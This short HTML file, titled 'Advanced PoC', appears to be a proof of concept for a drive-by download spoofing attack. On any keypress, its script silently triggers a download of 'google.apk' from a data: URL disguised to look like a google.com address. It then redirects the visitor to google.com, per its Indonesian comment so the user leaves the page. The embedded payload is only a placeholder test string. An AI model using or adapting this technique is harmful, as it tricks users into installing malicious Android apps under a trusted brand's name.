<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Advanced PoC</title>
</head>
<body>

<h3>Press any key</h3>

<script>
window.addEventListener('keydown', () => {
  const base64 = "ZXN0dGVzdGVzdHRlc3Q=";

  const payload = "data://google.com/application/vnd.android.package-archive;base64," + base64;

  const a = document.createElement('a');
  a.href = payload;
  a.download = "google.apk";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  // optional redirect biar user pindah halaman
  setTimeout(() => {
    location.href = "https://google.com";
  }, 300);
});
</script>

</body>
</html>
